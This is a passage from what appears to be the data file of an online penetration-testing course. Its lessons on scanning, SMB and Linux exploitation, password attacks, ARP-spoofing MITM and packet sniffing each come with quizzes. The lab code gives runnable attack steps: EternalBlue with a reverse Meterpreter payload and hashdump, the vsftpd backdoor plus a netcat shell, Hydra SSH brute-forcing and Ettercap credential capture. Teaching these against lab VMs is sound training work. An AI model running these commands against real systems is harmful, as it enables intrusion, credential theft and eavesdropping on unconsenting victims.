                    "<ul><li><strong>Unauthenticated Scan:</strong> This is a 'black box' scan. The scanner has no special credentials and tests the target from the perspective of an external attacker. It is good at finding vulnerabilities in externally-facing services.</li><li><strong>Authenticated Scan:</strong> This is a 'white box' scan. You provide the scanner with credentials (e.g., an SSH login for a Linux server or an SMB login for a Windows server). The scanner can then log in to the target system and perform much more accurate, low-level checks, such as listing all installed software and checking for missing security patches. Authenticated scans are far less disruptive and produce much more accurate results than unauthenticated scans.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1579226903282-c0e4821d4c38?w=800&h=400&fit=crop",
                },
                {
                  title: "Popular Vulnerability Scanners",
                  content:
                    "<ul><li><strong>Nessus:</strong> One of the most popular and widely respected vulnerability scanners in the industry. The 'Nessus Essentials' version is free for home use and can be used to scan a limited number of IPs.</li><li><strong>OpenVAS:</strong> A powerful, open-source vulnerability scanner that is a fork of an earlier version of Nessus. It is the scanner integrated into Greenbone Security Manager and is completely free.</li><li><strong>Nikto:</strong> A specialized, open-source web server scanner. It doesn't scan for network vulnerabilities, but performs comprehensive tests for thousands of potentially dangerous files, outdated server versions, and other specific web server misconfigurations.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1510511459019-5dda7724fd87?w=800&h=400&fit=crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Run OpenVAS against a Target VM",
                  language: "bash",
                  code: "# OpenVAS is part of Greenbone Vulnerability Management (GVM) in Kali Linux. It has a web-based interface.\n\n# Step 1: Install and Set up GVM (OpenVAS) on Kali.\n# This can be a lengthy, one-time process.\n# `sudo apt update && sudo apt install gvm`\n# `sudo gvm-setup`\n# Note the administrator password it generates for you.\n# `sudo gvm-start`\n\n# Step 2: Access the Greenbone Web Interface.\n# Open your browser and navigate to https://localhost:9392\n# Log in with the username 'admin' and the password generated during setup.\n\n# Step 3: Configure and Launch a Scan.\n# - Go to 'Scans' > 'Tasks'.\n# - Click the 'New Task' icon (purple star).\n# - Name your task (e.g., 'Metasploitable Scan').\n# - In the 'Targets' field, click the star icon to create a new target.\n# - Enter the IP address of your vulnerable VM (e.g., Metasploitable 2) and save.\n# - Use the default 'Full and fast' scan configuration.\n# - Click 'Save' to create the task.\n\n# Step 4: Run the Scan.\n# - Find your newly created task in the list and click the green 'Play' button to start the scan.\n# - This will take some time, as the scanner runs thousands of checks.\n\n# Step 5: Analyze the Report.\n# - Once the scan is complete, click on the report to view the results.\n# - The vulnerabilities are sorted by severity ('High', 'Medium', 'Low').\n# - Click on a high-severity finding. OpenVAS will provide a summary of the vulnerability, the proof of how it was detected, and often a recommended solution. This information is invaluable for the exploitation phase.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary role of a vulnerability scanner in a penetration test?",
                  options: [
                    "To automatically exploit all found vulnerabilities.",
                    "To identify and report on potential security weaknesses by checking against a database of known issues.",
                    "To act as a firewall to block attacks.",
                    "To sniff network traffic for passwords.",
                  ],
                  correct: 1,
                  explanation:
                    "A vulnerability scanner is a detection tool, not an exploitation tool. Its purpose is to find potential flaws that a pentester must then validate and analyze.",
                },
                {
                  id: 2,
                  question:
                    "Why is an authenticated scan generally more accurate than an unauthenticated scan?",
                  options: [
                    "It runs much faster.",
                    "It can log into the target system to check for things like missing security patches and detailed software versions, which are invisible from the outside.",
                    "It does not require a network connection.",
                    "It can only find high-risk vulnerabilities.",
                  ],
                  correct: 1,
                  explanation:
                    "By having 'insider' access, an authenticated scanner can get a much more complete and accurate picture of the system's security posture with fewer false positives.",
                },
                {
                  id: 3,
                  question:
                    "Nikto is a specialized scanner focused on which type of target?",
                  options: [
                    "Network routers",
                    "Databases",
                    "Web Servers",
                    "Desktop operating systems",
                  ],
                  correct: 2,
                  explanation:
                    "Nikto is a dedicated web server scanner, designed to find web-specific vulnerabilities like dangerous files, misconfigurations, and outdated software.",
                },
              ],
            },
          },
          {
            id: "lesson-6",
            title: "Exploiting SMB & Windows Services",
            duration: "90 min",
            objectives: [
              "Understand the role of the Metasploit Framework",
              "Identify common vulnerabilities in the SMB protocol",
              "Use Metasploit to exploit the EternalBlue vulnerability",
              "Understand post-exploitation techniques like Pass-the-Hash",
            ],
            content: {
              overview:
                "Now we move from discovery to attack. This lesson introduces the Metasploit Framework, the most powerful and widely used exploitation tool in penetration testing. We will focus on exploiting the SMB service, a frequent source of critical vulnerabilities on Windows networks, culminating in a hands-on lab using the famous EternalBlue exploit to gain full control of a target machine.",
              sections: [
                {
                  title: "The Metasploit Framework",
                  content:
                    "<p>The <strong>Metasploit Framework</strong> is an open-source platform for developing, testing, and executing exploit code. It's a massive database of exploits, payloads, and auxiliary modules that simplifies the process of penetration testing. It allows a tester to focus on the 'what' and 'why' of an attack, while Metasploit handles the complex 'how'.</p><h3>Key Metasploit Concepts:</h3><ul><li><strong>Exploit:</strong> A piece of code that takes advantage of a specific vulnerability in a target system.</li><li><strong>Payload:</strong> The code that will be executed on the target system <em>after</em> the exploit is successful. Payloads can be a simple command shell or a powerful, full-featured backdoor called a 'Meterpreter' session.</li><li><strong>Module:</strong> Any component within Metasploit, including exploits, payloads, auxiliary scanners, and post-exploitation tools.</li><li><strong>Listener:</strong> A process that runs on the attacker's machine, waiting for a 'reverse shell' connection from a payload that has been executed on the target.</li></ul>",
                  image: "https://i.imgur.com/gK2J8Xl.png",
                },
                {
                  title: "SMB Vulnerabilities and EternalBlue",
                  content:
                    "<p>The Server Message Block (SMB) protocol is used extensively in Windows for file sharing, printer sharing, and remote administration. Its complexity and deep integration into the OS have made it a frequent target for attackers.</p><p><strong>EternalBlue (MS17-010)</strong> is one of the most famous and impactful exploits ever discovered. It targets a vulnerability in Microsoft's implementation of the SMBv1 protocol. A specially crafted packet can cause a buffer overflow, allowing the attacker to execute arbitrary code on the target system with the highest privileges (SYSTEM). Even though a patch was released, many unpatched systems still exist. EternalBlue was famously used in the WannaCry and NotPetya ransomware attacks.</p>",
                  image:
                    "https://images.unsplash.com/photo-1593495147558-c1143a5390a8?w=800&h=400&fit=crop",
                },
                {
                  title: "Post-Exploitation: Pass-the-Hash",
                  content:
                    "<p>After gaining initial access, one of the first goals is to harvest credentials to move laterally to other machines. In Windows environments, systems don't use plaintext passwords for authentication; they use password 'hashes'.</p><p>A <strong>Pass-the-Hash (PtH)</strong> attack is a post-exploitation technique where an attacker steals a hashed user credential and, without ever cracking it to get the plaintext password, uses that hash to authenticate to other remote systems. Many Windows tools and protocols will accept a hash for authentication, making this a powerful technique for lateral movement within a domain.</p>",
                  image:
                    "https://images.unsplash.com/photo-1526374965328-5f61d25c0e40?w=800&h=400&fit=crop",
                },
              ],
              codeExamples: [
                {
                  title:
                    "Lab: Exploit a Windows SMB Vulnerability with Metasploit",
                  language: "bash",
                  code: "# This lab will target a Windows 7 or Windows Server 2008 VM, which are vulnerable to MS17-010.\n\n# Step 1: Start the Metasploit Framework console.\n# `msfdb init` (run this once to set up the database)\n`msfconsole`\n\n# Step 2: Search for the EternalBlue exploit.\n# Metasploit's `search` command is very powerful.\n`search eternalblue`\n# The exploit we want is likely `exploit/windows/smb/ms17_010_eternalblue`.\n\n# Step 3: Select and configure the exploit.\n# `use exploit/windows/smb/ms17_010_eternalblue`\n# `show options` (to see what we need to set)\n\n# We need to set the remote host (the target).\n`set RHOSTS TARGET_IP`\n\n# Step 4: Configure the payload.\n# We will use a reverse TCP Meterpreter payload. This provides the most features.\n`set payload windows/x64/meterpreter/reverse_tcp`\n# We need to tell the payload which IP to connect back to (our Kali machine).\n`set LHOST KALI_IP`\n\n# Step 5: Exploit!\n# Type `exploit` or `run` and press Enter.\n`exploit`\n\n# Step 6: Interact with the Meterpreter session.\n# If the exploit is successful, Metasploit will say 'Meterpreter session 1 opened'.\n# You are now inside the target system!\n# - `sysinfo`: Get system information.\n# - `getuid`: See which user you are running as (should be 'NT AUTHORITY\\SYSTEM').\n# - `shell`: Drop into a standard Windows command shell.\n# - `hashdump`: Dump all the password hashes from the SAM database.\n\n# You have now achieved full remote control of the Windows target.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question: "In the Metasploit Framework, what is a 'payload'?",
                  options: [
                    "The vulnerability in the target system.",
                    "The code that runs on the attacker's machine.",
                    "The code that is executed on the target system after a successful exploit.",
                    "A report of the findings.",
                  ],
                  correct: 2,
                  explanation:
                    "The exploit is what gets you in the door; the payload is what you do once you're inside (e.g., open a shell).",
                },
                {
                  id: 2,
                  question:
                    "The EternalBlue (MS17-010) exploit targets a vulnerability in which protocol?",
                  options: ["HTTP", "SSH", "SMBv1", "FTP"],
                  correct: 2,
                  explanation:
                    "EternalBlue specifically targets a buffer overflow vulnerability in Microsoft's implementation of the SMB version 1 protocol.",
                },
                {
                  id: 3,
                  question: "What is a 'Pass-the-Hash' attack?",
                  options: [
                    "Cracking a password hash to find the original password.",
                    "Using a stolen password hash to authenticate to another system, without ever knowing the plaintext password.",
                    "A type of denial-of-service attack.",
                    "Encrypting a file with a strong hashing algorithm.",
                  ],
                  correct: 1,
                  explanation:
                    "Pass-the-Hash is a powerful lateral movement technique because it bypasses the need for password cracking, leveraging how Windows handles authentication.",
                },
              ],
            },
          },
          {
            id: "lesson-7",
            title: "Exploiting Linux Services",
            duration: "75 min",
            objectives: [
              "Identify common misconfigurations in Linux network services",
              "Exploit an anonymous, writable FTP server to gain a shell",
              "Understand the risks of exposed NFS shares",
              "Enumerate and exploit weak SSH configurations",
            ],
            content: {
              overview:
                "While Windows has high-profile exploits like EternalBlue, Linux systems are just as vulnerable when misconfigured. This lesson focuses on common security flaws in standard Linux services like FTP, NFS, and SSH. We will see how simple mistakes, such as allowing anonymous file uploads or using default credentials, can lead to a full system compromise.",
              sections: [
                {
                  title: "FTP Misconfigurations",
                  content:
                    "<p>The File Transfer Protocol (FTP) is an old protocol with a history of security issues. The most common and critical misconfiguration is allowing <strong>anonymous FTP login</strong>. If an administrator enables anonymous access but fails to properly restrict permissions, an attacker might find:</p><ul><li><strong>Sensitive Information:</strong> System configuration files, user lists, or backups may be unintentionally exposed.</li><li><strong>Writable Directories:</strong> This is the most dangerous scenario. If an anonymous user can upload files, they can upload a web shell, a malicious script, or a reverse shell payload and then find a way to execute it, leading to remote code execution.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1614064548237-02f4d3544d42?w=800&h=400&fit=crop",
                },
                {
                  title: "NFS Misconfigurations",
                  content:
                    "<p>The Network File System (NFS) allows a client machine to mount a directory from a server and treat it like a local directory. It is convenient but can be very insecure if not configured properly.</p><p>A common vulnerability arises when an NFS export is configured with the <strong>`no_root_squash`</strong> option. By default, if the root user on a client machine tries to access the mount, the NFS server 'squashes' their privileges down to a low-privileged user (like 'nobody'). If `no_root_squash` is enabled, the client's root user is treated as the server's root user for that share. An attacker can then create malicious files with special permissions (like a SUID binary) on the share, which can then be executed on the server to gain root access.</p>",
                  image:
                    "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop",
                },
                {
                  title: "Weak SSH Configurations",
                  content:
                    "<p>Secure Shell (SSH) is generally a very secure protocol. Most vulnerabilities arise from poor configuration and weak credentials, not the protocol itself.</p><ul><li><strong>Weak Passwords:</strong> The most common issue. If users have simple, guessable passwords, their accounts can be brute-forced. This is why password-based authentication is often disabled in favor of more secure key-based authentication.</li><li><strong>Allowing Root Login:</strong> Configuring SSH to allow direct login for the root user (`PermitRootLogin yes`) is highly discouraged. It gives attackers a known, high-value target account to attack.</li><li><strong>Outdated Versions:</strong> Older versions of SSH have known vulnerabilities that could allow an attacker to bypass authentication or gain privileges.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit-crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Exploit Anonymous FTP Login on Metasploitable 2",
                  language: "bash",
                  code: "# Metasploitable 2 has a vulnerable version of vsftpd with a secret backdoor.\n# But first, let's explore it manually.\n\n# Step 1: Check for Anonymous FTP login.\n# Try to log in with the username 'anonymous' and any password.\n`ftp TARGET_IP`\n`Name: anonymous`\n`Password: user@example.com`\n# If you get a '230 Login successful' message, you're in.\n\n# Step 2: Manually Enumerate the FTP Server.\n# `ls -la` (to see all files and directories)\n# `cd` (to change directories)\n# `get [filename]` (to download a file)\n# `put [filename]` (to upload a file)\n# Check for writable directories. If you can upload a file, that's a potential vector.\n\n# Step 3: Exploit with Metasploit (vsftpd Backdoor).\n# The version of vsftpd on Metasploitable 2 has a known backdoor.\n`msfconsole`\n`search vsftpd`\n`use exploit/unix/ftp/vsftpd_234_backdoor`\n`set RHOSTS TARGET_IP`\n`exploit`\n\n# Step 4: Gain a Root Shell.\n# If successful, this exploit doesn't give you a meterpreter session, but it opens a command shell listener on port 6200.\n# In a new terminal, connect to this port with netcat.\n`nc -nv TARGET_IP 6200`\n\n# You should now be in a shell. Type `whoami` and `id`.\n# You will have a root shell, demonstrating a full system compromise from a single vulnerable service.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the most dangerous misconfiguration for an anonymous FTP server?",
                  options: [
                    "Allowing too many simultaneous connections.",
                    "Having a writable directory that anonymous users can upload files to.",
                    "Using a non-standard port for FTP.",
                    "Displaying a detailed version banner.",
                  ],
                  correct: 1,
                  explanation:
                    "An anonymous, writable directory allows an attacker to upload a reverse shell or other malware, which can lead directly to Remote Code Execution.",
                },
                {
                  id: 2,
                  question: "In NFS, what does the 'no_root_squash' option do?",
                  options: [
                    "It prevents the root user from accessing the share.",
                    "It encrypts all traffic for the root user.",
                    "It allows a root user on a client machine to have root-level permissions on the mounted share, which is very dangerous.",
                    "It compresses all files written by the root user.",
                  ],
                  correct: 2,
                  explanation:
                    "`no_root_squash` breaks the principle of least privilege and allows a remote root user to be treated as the local root user, which is a major security flaw.",
                },
                {
                  id: 3,
                  question:
                    "What is the recommended best practice for SSH authentication to prevent password attacks?",
                  options: [
                    "Enforce very long and complex passwords.",
                    "Use a non-standard port for SSH.",
                    "Disable password-based authentication entirely and use only public key-based authentication.",
                    "Allow direct root login so administrators don't have to use 'sudo'.",
                  ],
                  correct: 2,
                  explanation:
                    "Public key authentication is vastly more secure than passwords and is not vulnerable to brute-force or dictionary attacks.",
                },
              ],
            },
          },
          {
            id: "lesson-8",
            title: "Password Attacks",
            duration: "75 min",
            objectives: [
              "Define the different types of online password attacks",
              "Perform a dictionary attack against a service using Hydra",
              "Perform a brute-force attack",
              "Understand the concept of password spraying",
            ],
            content: {
              overview:
                "Despite years of warnings, weak and reused passwords remain one of the most common ways attackers gain initial access to a system. This lesson covers the techniques used to attack password-based authentication online, using automated tools to guess credentials for services like SSH, FTP, and RDP.",
              sections: [
                {
                  title: "Types of Online Password Attacks",
                  content:
                    "<p>Online password attacks involve actively trying to log in to a live service. They are 'noisy' and can cause account lockouts, but are often successful.</p><ul><li><strong>Dictionary Attack:</strong> This is the most common and efficient method. Instead of trying every possible combination of letters, the attacker uses a wordlist (`rockyou.txt` is a famous example) containing thousands or millions of common passwords. The tool attempts to log in with a specific username and every password from the list.</li><li><strong>Brute-Force Attack:</strong> This method systematically tries every possible combination of characters for a password of a given length. While it will eventually find any password, it is incredibly slow and impractical for anything but very short or simple passwords (e.g., a 4-digit PIN).</li><li><strong>Password Spraying:</strong> This is a much stealthier technique. Instead of trying many passwords against one user (which would lock out the account), password spraying tries one or two very common passwords (e.g., `Password123`, `Summer2025`) against a large list of usernames. This is less likely to trigger lockout policies and is very effective in corporate environments.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop",
                },
                {
                  title: "Password Cracking vs. Password Attacks",
                  content:
                    "<p>It's important to differentiate between an online password attack and offline password cracking. <strong>Online attacks</strong> (this lesson) guess passwords against a live, running service. <strong>Offline cracking</strong> (covered later in Post-Exploitation) involves obtaining a list of password hashes (e.g., from dumping the SAM database). With the hashes, you can use your own powerful hardware to try and crack them very rapidly without interacting with the target and without fear of account lockouts. Cracking is always preferred if you can get the hashes.</p>",
                  image:
                    "https://images.unsplash.com/photo-1526374965328-5f61d25c0e40?w=800&h=400&fit=crop",
                },
                {
                  title: "Hydra: The Online Attacking Tool",
                  content:
                    "<p><strong>Hydra</strong> is a very popular, fast, and flexible online password attacking tool. It supports a huge number of protocols, including SSH, FTP, RDP, Telnet, HTTP-POST, SMB, and many more. It can be used to perform all the attack types described above by providing it with a target, a username (or a list of usernames), and a password list (or instructions for brute-forcing).</p>",
                  image: "https://i.imgur.com/8QnU42j.png",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Crack an SSH Password with Hydra",
                  language: "bash",
                  code: "# In this lab, we will use Hydra to find the password for the 'msfadmin' user on Metasploitable 2.\n\n# Prerequisites:\n# - From enumeration (Lesson 4), you should know that 'msfadmin' is a valid username.\n# - Kali Linux comes with many wordlists. A famous one is 'rockyou.txt', which is located in `/usr/share/wordlists/rockyou.txt.gz`. You need to decompress it first.\n`sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`\n\n# Step 1: Formulate the Hydra command for a dictionary attack.\n# hydra [options] target_ip service\n#\n# -l msfadmin : The login username we are targeting.\n# -P /usr/share/wordlists/rockyou.txt : The Path to the password list.\n# -t 4 : Use 4 parallel tasks to speed up the attack.\n# TARGET_IP : The IP address of your Metasploitable 2 VM.\n# ssh : The protocol we are attacking.\n\nhydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 TARGET_IP ssh\n\n# Step 2: Run the command and wait.\n# Hydra will begin trying every password in the rockyou.txt file against the 'msfadmin' account over SSH.\n# It will eventually find the correct password.\n# The Metasploitable 2 password for msfadmin is 'msfadmin', which is usually found very quickly.\n\n# Step 3: Verify the credential.\n# Once Hydra shows the valid password, try to log in with it.\n`ssh msfadmin@TARGET_IP`\n# Enter the password found by Hydra.\n# You should get a successful login.\n\n# Step 4: (Optional) Brute-Force attack for a 4-digit PIN\n# If you were attacking a 4-digit pin, the command would be different.\n# `hydra -l admin -x 4:4:0-9 TARGET_IP http-post-form \"...\"`\n# `-x 4:4:0-9` tells Hydra to generate passwords of min length 4, max length 4, using only digits.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question: "What is a dictionary attack?",
                  options: [
                    "Trying every single possible combination of characters.",
                    "An attack that uses a pre-compiled list of common passwords (a wordlist).",
                    "An attack that targets the DNS server.",
                    "A type of social engineering attack.",
                  ],
                  correct: 1,
                  explanation:
                    "A dictionary attack is much more efficient than a pure brute-force attack because it focuses on likely passwords found in wordlists.",
                },
                {
                  id: 2,
                  question:
                    "What is the primary goal of a 'password spraying' attack?",
                  options: [
                    "To try as many passwords as possible against a single user.",
                    "To avoid account lockout policies by trying only a few common passwords against many different users.",
                    "To crack a stolen password hash offline.",
                    "To find the administrator's password.",
                  ],
                  correct: 1,
                  explanation:
                    "Password spraying is a 'low and slow' technique designed for stealth. It leverages the fact that in any large organization, someone has likely used a very simple password like 'Winter2025'.",
                },
                {
                  id: 3,
                  question: "The tool Hydra is used for what kind of attack?",
                  options: [
                    "Offline password cracking",
                    "Network sniffing",
                    "Creating exploits",
                    "Online password guessing against live services",
                  ],
                  correct: 3,
                  explanation:
                    "Hydra is a specialized tool for performing online password attacks like dictionary and brute-force attacks against a wide variety of network protocols.",
                },
              ],
            },
          },
          {
            id: "lesson-9",
            title: "MITM (Man-in-the-Middle) Attacks",
            duration: "90 min",
            objectives: [
              "Define a Man-in-the-Middle (MITM) attack",
              "Explain how ARP spoofing works on a local network",
              "Understand the goal of DNS spoofing",
              "Use Ettercap to perform a basic MITM attack",
            ],
            content: {
              overview:
                "A Man-in-the-Middle (MITM) attack is a powerful technique where an attacker secretly intercepts and potentially alters the communication between two parties who believe they are communicating directly. This lesson focuses on ARP spoofing, the most common method for achieving a MITM position on a local area network (LAN), allowing an attacker to eavesdrop on all of a victim's traffic.",
              sections: [
                {
                  title: "What is a MITM Attack?",
                  content:
                    "<p>In a MITM attack, the attacker places themselves in the communication path between a victim and another entity, such as the network gateway (router). From this privileged position, the attacker can:</p><ul><li><strong>Eavesdrop (Sniff):</strong> Passively read all the traffic sent between the victim and the destination. If the traffic is unencrypted (like standard HTTP), the attacker can see usernames, passwords, and session cookies in cleartext.</li><li><strong>Manipulate:</strong> Actively modify traffic on the fly. An attacker could inject malicious code into a website, change the contents of a downloaded file, or redirect the user to a phishing page.</li></ul><p>On a switched network, hosts normally communicate directly with each other, so achieving this position requires actively tricking the network devices.</p>",
                  image: "https://i.imgur.com/kK3hF4r.png",
                },
                {
                  title: "ARP Spoofing: Poisoning the Cache",
                  content:
                    "<p>The <strong>Address Resolution Protocol (ARP)</strong> is used on a LAN to map an IP address (a logical address) to a MAC address (a physical hardware address). When a computer wants to send a packet to another IP on the local network, it sends an ARP request asking 'Who has this IP address?' The owner of that IP replies with its MAC address. For efficiency, computers store these mappings in an ARP cache.</p><p><strong>ARP spoofing</strong> (or ARP cache poisoning) exploits the fact that ARP is a trust-based protocol. An attacker can send unsolicited ARP replies to the victim and the gateway. For example:</p><ol><li>The attacker tells the victim machine: 'I am the gateway. My MAC address is [Attacker's MAC]'. The victim updates its ARP cache, sending all internet-bound traffic to the attacker.</li><li>The attacker tells the gateway: 'I am the victim machine. My MAC address is [Attacker's MAC]'. The gateway updates its cache, sending all traffic destined for the victim to the attacker.</li></ol><p>The attacker's machine is now the 'man in the middle' and must remember to forward the traffic between the victim and gateway to keep the connection alive and remain undetected.</p>",
                  image:
                    "https://images.unsplash.com/photo-1542382257-80ded13c79c8?w=800&h=400&fit=crop",
                },
                {
                  title: "DNS Spoofing",
                  content:
                    "<p>Once in a MITM position, an attacker can perform <strong>DNS spoofing</strong>. When the victim's computer sends a DNS query to resolve a domain name (like `www.mybank.com`), the attacker intercepts the query. Instead of forwarding it to the real DNS server, the attacker sends a forged response, telling the victim that `www.mybank.com` is at an IP address of a malicious server controlled by the attacker. The victim's browser then connects to the fake server, allowing the attacker to present a phishing page and steal credentials.</p>",
                  image:
                    "https://images.unsplash.com/photo-1621640348395-502f04b2e811?w=800&h=400&fit-crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Launch a MITM Attack with Ettercap",
                  language: "bash",
                  code: "# Ettercap is a classic and powerful tool for MITM attacks on a LAN.\n# WARNING: Only perform this in your isolated lab network. It will disrupt traffic for the targeted machines.\n\n# Step 1: Enable IP Forwarding on your Kali machine.\n# This is crucial. It tells your OS to forward packets between interfaces, keeping the victim connected.\n`echo 1 > /proc/sys/net/ipv4/ip_forward`\n\n# Step 2: Launch Ettercap in graphical mode.\n`sudo ettercap -G`\n\n# Step 3: Configure the Sniffing.\n# - From the 'Sniff' menu, choose 'Unified sniffing...'.\n# - Select your primary network interface (e.g., eth0) and click OK.\n\n# Step 4: Scan for Hosts.\n# - From the 'Hosts' menu, choose 'Scan for hosts'.\n# - Wait for it to complete. Then, from the 'Hosts' menu, choose 'Hosts list'.\n# - You will see a list of all the devices Ettercap found on the network.\n\n# Step 5: Set your Targets.\n# - Find the IP address of your victim machine (e.g., a Windows VM) and click 'Add to Target 1'.\n# - Find the IP address of the gateway (your router) and click 'Add to Target 2'.\n\n# Step 6: Start the ARP Poisoning Attack.\n# - From the 'Mitm' menu, select 'Arp poisoning...'.\n# - Check the box for 'Sniff remote connections' and click OK.\n\n# Step 7: Start Sniffing.\n# - From the 'Start' menu, click 'Start sniffing'.\n# - Ettercap is now performing the ARP spoofing attack. All traffic between your victim and the gateway is now passing through your Kali machine.\n\n# Step 8: Observe.\n# - On your victim machine, browse to an HTTP (not HTTPS) website with a login page (e.g., http://testphp.vulnweb.com/login.php).\n# - Enter a fake username and password.\n# - In the Ettercap window at the bottom, you will see the captured POST request containing the username and password in cleartext.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary goal of an ARP spoofing attack?",
                  options: [
                    "To shut down the network switch.",
                    "To trick devices on a local network into sending their traffic to the attacker's machine instead of the legitimate destination.",
                    "To crack the Wi-Fi password.",
                    "To delete files from a target computer.",
                  ],
                  correct: 1,
                  explanation:
                    "ARP spoofing works by poisoning the ARP cache of the victim and gateway, effectively redirecting the flow of traffic so it passes through the attacker.",
                },
                {
                  id: 2,
                  question:
                    "Which of these is NOT something a Man-in-the-Middle attacker can typically do?",
                  options: [
                    "Read unencrypted traffic like HTTP passwords.",
                    "Modify traffic in transit.",
                    "Redirect a user to a malicious website.",
                    "Read the contents of a properly encrypted HTTPS session.",
                  ],
                  correct: 3,
                  explanation:
                    "The primary defense against MITM attacks is end-to-end encryption. With HTTPS, even though the attacker can see the encrypted packets, they cannot read the content without the private key.",
                },
                {
                  id: 3,
                  question:
                    "In an ARP spoofing attack, what is the purpose of enabling IP forwarding on the attacker's machine?",
                  options: [
                    "To increase the attacker's internet speed.",
                    "To ensure that the victim's traffic is passed on to the gateway, maintaining their internet connectivity and keeping the attack hidden.",
                    "To block the victim's traffic, causing a denial-of-service.",
                    "To change the attacker's MAC address.",
                  ],
                  correct: 1,
                  explanation:
                    "If the attacker doesn't forward the traffic, the victim's connection will drop, and they will immediately know something is wrong. Forwarding is key to a stealthy MITM attack.",
                },
              ],
            },
          },
          {
            id: "lesson-10",
            title: "Network Sniffing & Traffic Analysis",
            duration: "75 min",
            objectives: [
              "Define network sniffing and its applications",
              "Use Wireshark to capture and filter network traffic",
              "Identify and extract cleartext credentials from a packet capture",
              "Understand the concept of TCP session hijacking",
            ],
            content: {
              overview:
                "Network sniffing is the process of capturing and inspecting the data packets that travel across a network. It is a fundamental skill for both network administrators and penetration testers. In this lesson, we'll use Wireshark, the world's foremost network protocol analyzer, to capture traffic from our MITM attack and extract sensitive information like passwords and session cookies sent over unencrypted protocols.",
              sections: [
                {
                  title: "The Art of Packet Analysis",
                  content:
                    "<p>Network sniffing, at its core, is a form of wiretapping for computer networks. An attacker who has achieved a Man-in-the-Middle position can use a sniffing tool to create a copy of every packet that flows between the victim and the internet. Analyzing this raw data, called a packet capture (PCAP), can reveal a treasure trove of information.</p><h3>The Power of Wireshark</h3><p><strong>Wireshark</strong> is an incredibly powerful open-source tool for network traffic analysis. It can capture live traffic, open saved capture files, and decode thousands of different protocols. It allows a user to drill down from a high-level view of a TCP conversation to the individual bytes of a single packet, making it an indispensable tool for debugging network issues and, for our purposes, finding sensitive data in transit.</p>",
                  image: "https://i.imgur.com/eE90mUe.jpg",
                },
                {
                  title: "Hunting for Cleartext Credentials",
                  content:
                    "<p>The number one goal when sniffing traffic is to find usernames and passwords. Any protocol that does not use encryption sends this information in <strong>cleartext</strong>, meaning it is directly readable in the packet capture. This is the biggest single reason why HTTPS is so important. Common legacy protocols that send cleartext credentials include:</p><ul><li>HTTP (Hypertext Transfer Protocol)</li><li>FTP (File Transfer Protocol)</li><li>Telnet</li><li>POP3/IMAP/SMTP (without STARTTLS)</li></ul><p>By capturing traffic from a victim and filtering for these protocols, an attacker can simply read the login credentials out of the data stream.</p>",
                  image:
                    "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop",
                },
                {
                  title: "Session Hijacking",
                  content:
                    "<p>Even if an attacker can't capture the initial password, they may be able to hijack a user's logged-in session. Many websites maintain a user's session by sending a small piece of data called a <strong>session cookie</strong> back to the user's browser after they log in. The browser then includes this cookie in every subsequent request to the site to prove it is still the same authenticated user.</p><p>If this cookie is sent over unencrypted HTTP, a sniffer can capture it. The attacker can then take this session cookie and use it in their own browser to impersonate the user, gaining access to their account without ever needing the password. This is known as TCP session hijacking.</p>",
                  image:
                    "https://images.unsplash.com/photo-1593495147558-c1143a5390a8?w=800&h=400&fit=crop",
                },
              ],
            },
            codeExamples: [
              {
                title: "Lab: Capture an HTTP Login with Wireshark",
                language: "bash",
                code: "# This lab builds on the previous lesson's MITM attack.\n\n# Step 1: Start the ARP Spoofing attack with Ettercap or a similar tool like `arpspoof`.\n# You need to be in a MITM position to capture the victim's traffic.\n\n# Step 2: Launch Wireshark on your Kali machine.\n# `sudo wireshark`\n\n# Step 3: Start the Capture.\n# - A dialog will appear asking which interface to capture on.\n# - Select your primary network interface (e.g., eth0) and click 'Start'.\n# - You will see a real-time stream of all the packets passing through your interface.\n\n# Step 4: Generate Traffic from the Victim Machine.\n# - On your victim VM, open a browser and go to a site that uses HTTP for login.\n# - A good example is http://testphp.vulnweb.com/login.php\n# - Enter a fake username and password (e.g., user: admin, pass: password123) and click 'login'.\n\n# Step 5: Stop the Capture and Filter the Results.\n# - Go back to Wireshark and click the red 'Stop' button.\n# - Now you need to find the needle in the haystack. In the 'Apply a display filter' bar, type:\n#   `http.request.method == \"POST\"`\n# - This filter will only show HTTP POST requests, which are typically used to submit login forms.\n\n# Step 6: Analyze the Packet and Find the Credentials.\n# - You should see a packet from your victim's IP to the testphp server.\n# - Click on this packet. In the packet details pane below, expand the 'Hypertext Transfer Protocol' layer.\n# - Look for the 'HTML Form URL Encoded' section. Inside, you will see the cleartext username and password you entered.",
              },
            ],
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What does it mean for a credential to be sent in 'cleartext'?",
                  options: [
                    "It is strongly encrypted.",
                    "It is sent in plain, readable text with no encryption.",
                    "It is sent using a secure protocol.",
                    "It is a very simple password.",
                  ],
                  correct: 1,
                  explanation:
                    "Cleartext means the data is unencrypted and can be read by anyone who can capture the network packet.",
                },
                {
                  id: 2,
                  question:
                    "Wireshark is a tool used for what primary purpose?",
                  options: [
                    "Launching denial-of-service attacks.",
                    "Capturing and analyzing network traffic at the packet level.",
                    "Cracking passwords.",
                    "Writing pentest reports.",
                  ],
                  correct: 1,
                  explanation:
